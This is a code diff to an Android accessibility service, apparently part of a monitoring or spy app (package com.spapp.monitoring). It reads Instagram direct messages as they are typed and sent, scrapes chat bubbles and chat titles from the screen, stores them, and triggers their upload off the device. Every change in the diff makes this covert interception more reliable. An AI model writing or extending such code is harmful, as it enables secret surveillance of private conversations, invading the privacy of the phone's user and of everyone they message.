@@ -716,7 +716,7 @@ class BlockAccessibilityService : AccessibilityService() {
             // 1. Track composer text while user types
             try {
                 val root = rootInActiveWindow
-                val entryNode = root?.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")?.firstOrNull()
+                val entryNode = findInstagramComposerNode(root)
                 val currentText = entryNode?.text?.toString()?.trim()
                 if (!currentText.isNullOrBlank() && !currentText.equals("Message...", ignoreCase = true)) {
                     lastInstagramComposerText = currentText
@@ -741,18 +741,23 @@ class BlockAccessibilityService : AccessibilityService() {
                         val cText = clickedNode.text?.toString()?.trim() ?: ""
                         val cDesc = clickedNode.contentDescription?.toString()?.trim() ?: ""
                         val cId = (clickedNode.viewIdResourceName ?: "").lowercase()
+                        val pDesc = (clickedNode.parent?.contentDescription?.toString() ?: "").trim()
+                        val pId = (clickedNode.parent?.viewIdResourceName ?: "").lowercase()
 
                         val isSendClick = cDesc.contains("send", ignoreCase = true) ||
                                           cText.equals("send", ignoreCase = true) ||
                                           cId.contains("composer_button_send") ||
                                           cId.endsWith(":id/send_button") ||
-                                          (cId.contains("action_button") && cDesc.contains("send", ignoreCase = true))
+                                          (cId.contains("action_button") && cDesc.contains("send", ignoreCase = true)) ||
+                                          pDesc.contains("send", ignoreCase = true) ||
+                                          pId.contains("composer_button_send") ||
+                                          pId.endsWith(":id/send_button")
 
                         if (isSendClick) {
                             var sentText = lastInstagramComposerText
                             if (sentText.isNullOrBlank()) {
                                 try {
-                                    val entry = rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")?.firstOrNull()
+                                    val entry = findInstagramComposerNode(rootInActiveWindow)
                                     val et = entry?.text?.toString()?.trim()
                                     if (!et.isNullOrBlank() && !et.equals("Message...", ignoreCase = true)) {
                                         sentText = et
@@ -762,17 +767,20 @@ class BlockAccessibilityService : AccessibilityService() {
 
                             val chatTitle = getInstagramCurrentChatTitle(rootInActiveWindow)
                             val textToSend = sentText
+                            // Clear composer memory IMMEDIATELY so next message doesn't collide
+                            lastInstagramComposerText = null
+
                             if (!textToSend.isNullOrBlank() && !chatTitle.isNullOrBlank()) {
                                 val now = System.currentTimeMillis()
                                 recordRecentSentInstagramText(textToSend)
                                 val dedupeKey = "ig|$chatTitle|$textToSend|true|text"
-                                if (shouldCaptureMessage(dedupeKey, 60_000L)) {
+                                if (shouldCaptureMessage(dedupeKey, 1500L)) {
                                     scope.launch {
                                         try {
                                             val db = AppDatabase.getInstance(applicationContext)
-                                            db.instagramMessageDao().updateToOutgoing(chatTitle, textToSend, now - 600_000L)
+                                            db.instagramMessageDao().updateToOutgoing(chatTitle, textToSend, now - 60_000L)
                                             val existingId = db.instagramMessageDao().findExistingRecent(
-                                                chatTitle, textToSend, true, now - 600_000L
+                                                chatTitle, textToSend, true, now - 2_000L
                                             )
                                             if (existingId == null) {
                                                 db.instagramMessageDao().insertAll(
@@ -792,7 +800,6 @@ class BlockAccessibilityService : AccessibilityService() {
                                         } catch (_: Exception) {}
                                     }
                                 }
-                                lastInstagramComposerText = null
                             }
                             pollHandler.postDelayed({
                                 recordInstagramChatIfForeground(rootInActiveWindow)
@@ -837,43 +844,46 @@ class BlockAccessibilityService : AccessibilityService() {
             if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 try {
                     val root = rootInActiveWindow
-                    val entryNode = root?.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")?.firstOrNull()
-                    val newText = entryNode?.text?.toString()?.trim()
-                    if (newText.isNullOrBlank() && !lastInstagramComposerText.isNullOrBlank()) {
-                        val sentText = lastInstagramComposerText!!
-                        val chatTitle = getInstagramCurrentChatTitle(root)
-                        if (!chatTitle.isNullOrBlank()) {
-                            val now = System.currentTimeMillis()
-                            recordRecentSentInstagramText(sentText)
-                            val dedupeKey = "ig|$chatTitle|$sentText|true|text"
-                            if (shouldCaptureMessage(dedupeKey, 60_000L)) {
-                                scope.launch {
-                                    try {
-                                        val db = AppDatabase.getInstance(applicationContext)
-                                        db.instagramMessageDao().updateToOutgoing(chatTitle, sentText, now - 600_000L)
-                                        val existingId = db.instagramMessageDao().findExistingRecent(
-                                            chatTitle, sentText, true, now - 600_000L
-                                        )
-                                        if (existingId == null) {
-                                            db.instagramMessageDao().insertAll(
-                                                listOf(
-                                                    InstagramMessageEntry(
-                                                        chatName = chatTitle,
-                                                        sender = "me",
-                                                        messageText = sentText,
-                                                        isOutgoing = true,
-                                                        messageTimeEpochMs = now,
-                                                        mediaType = "text"
+                    val entryNode = findInstagramComposerNode(root)
+                    if (entryNode != null) {
+                        val newText = entryNode.text?.toString()?.trim()
+                        val isNowEmpty = newText.isNullOrBlank() || newText.equals("Message...", ignoreCase = true)
+                        if (isNowEmpty && !lastInstagramComposerText.isNullOrBlank()) {
+                            val sentText = lastInstagramComposerText!!
+                            val chatTitle = getInstagramCurrentChatTitle(root)
+                            if (!chatTitle.isNullOrBlank()) {
+                                val now = System.currentTimeMillis()
+                                recordRecentSentInstagramText(sentText)
+                                val dedupeKey = "ig|$chatTitle|$sentText|true|text"
+                                if (shouldCaptureMessage(dedupeKey, 1500L)) {
+                                    scope.launch {
+                                        try {
+                                            val db = AppDatabase.getInstance(applicationContext)
+                                            db.instagramMessageDao().updateToOutgoing(chatTitle, sentText, now - 60_000L)
+                                            val existingId = db.instagramMessageDao().findExistingRecent(
+                                                chatTitle, sentText, true, now - 2_000L
+                                            )
+                                            if (existingId == null) {
+                                                db.instagramMessageDao().insertAll(
+                                                    listOf(
+                                                        InstagramMessageEntry(
+                                                            chatName = chatTitle,
+                                                            sender = "me",
+                                                            messageText = sentText,
+                                                            isOutgoing = true,
+                                                            messageTimeEpochMs = now,
+                                                            mediaType = "text"
+                                                        )
                                                     )
                                                 )
-                                            )
-                                            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
-                                        }
-                                    } catch (_: Exception) {}
+                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                                            }
+                                        } catch (_: Exception) {}
+                                    }
                                 }
                             }
+                            lastInstagramComposerText = null
                         }
-                        lastInstagramComposerText = null
                     }
                 } catch (_: Exception) {}
             }
@@ -1040,6 +1050,42 @@ class BlockAccessibilityService : AccessibilityService() {
                     val hint = (node.hintText?.toString() ?: "").lowercase()
                     val desc = (node.contentDescription?.toString() ?: "").lowercase()
                     if (!id.contains("search") && !desc.contains("search") && !hint.contains("search") && !hint.contains("meta ai")) {
+                        if (rect.bottom > screenHeight * 0.35f) {
+                            found = node
+                            return
+                        }
+                    }
+                }
+                for (i in 0 until node.childCount) {
+                    search(node.getChild(i), depth + 1)
+                    if (found != null) return
+                }
+            } catch (_: Exception) {}
+        }
+        search(root)
+        return found
+    }
+
+    fun findInstagramComposerNode(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        if (root == null) return null
+        try {
+            val byId = root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")
+            if (!byId.isNullOrEmpty()) return byId[0]
+        } catch (_: Exception) {}
+
+        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
+        var found: AccessibilityNodeInfo? = null
+
+        fun search(node: AccessibilityNodeInfo?, depth: Int = 0) {
+            if (node == null || depth > 35 || found != null) return
+            try {
+                if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
+                    val rect = Rect()
+                    node.getBoundsInScreen(rect)
+                    val id = (node.viewIdResourceName ?: "").lowercase()
+                    val hint = (node.hintText?.toString() ?: "").lowercase()
+                    val desc = (node.contentDescription?.toString() ?: "").lowercase()
+                    if (!id.contains("search") && !desc.contains("search") && !hint.contains("search")) {
                         if (rect.bottom > screenHeight * 0.35f) {
                             found = node
                             return
@@ -1457,7 +1503,10 @@ class BlockAccessibilityService : AccessibilityService() {
                 val text = (node?.text ?: node?.contentDescription)?.toString()?.trim()
                 if (!text.isNullOrBlank() && !reservedTitles.contains(text) && !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(text)) {
                     val clean = text.replace("\\s+".toRegex(), " ").trim()
-                    if (clean.length in 2..60) return clean
+                    if (clean.length in 2..60) {
+                        lastClickedInstagramChat = clean
+                        return clean
+                    }
                 }
             }
 
@@ -1488,6 +1537,7 @@ class BlockAccessibilityService : AccessibilityService() {
             }
             if (!candidate.isNullOrBlank()) {
                 val clean = candidate.replace("\\s+".toRegex(), " ").trim()
+                lastClickedInstagramChat = clean
                 return clean
             }
         } catch (_: Exception) {}
@@ -2203,7 +2253,7 @@ class BlockAccessibilityService : AccessibilityService() {
             root.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")
         } catch (_: Exception) { null }
 
-        if (composerNodes.isNullOrEmpty() && !hasDirectChatComposer(root, 0)) {
+        if (composerNodes.isNullOrEmpty() && !hasDirectChatComposer(root, 0) && findInstagramComposerNode(root) == null) {
             recordInstagramDirectListIfVisible(root)
             return
         }
@@ -2273,8 +2323,8 @@ class BlockAccessibilityService : AccessibilityService() {
                         val rect = Rect()
                         node.getBoundsInScreen(rect)
 
-                        // Message bubbles appear between the top header (top > 80) and bottom message composer (bottom <= (displayMetrics.heightPixels - 50))
-                        if (rect.top > 80 && rect.bottom <= (displayMetrics.heightPixels - 50)) {
+                        // Message bubbles appear between the top header (top > 40) and bottom message composer (bottom <= displayMetrics.heightPixels)
+                        if (rect.top > 40 && rect.bottom <= displayMetrics.heightPixels) {
                             val isTextTs = !t.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(t)
                             val isCdTs = !cd.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cd)
 
@@ -2364,7 +2414,7 @@ class BlockAccessibilityService : AccessibilityService() {
                     }
 
                     val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
-                    if (shouldCaptureMessage(key, 3_000L)) {
+                    if (shouldCaptureMessage(key, 1500L)) {
                         entriesToInsert.add(
                             InstagramMessageEntry(
                                 chatName = chatTitle,
@@ -2390,7 +2440,7 @@ class BlockAccessibilityService : AccessibilityService() {
                             val existingDirection = db.instagramMessageDao().findRecentMessageDirection(
                                 entry.chatName,
                                 entry.messageText,
-                                entry.messageTimeEpochMs - 30_000L
+                                entry.messageTimeEpochMs - 2_000L
                             )
                             if (existingDirection == null) {
                                 filteredEntries.add(entry)
@@ -2398,7 +2448,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                 db.instagramMessageDao().updateToOutgoing(
                                     entry.chatName,
                                     entry.messageText,
-                                    entry.messageTimeEpochMs - 30_000L
+                                    entry.messageTimeEpochMs - 60_000L
                                 )
                                 com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                             }
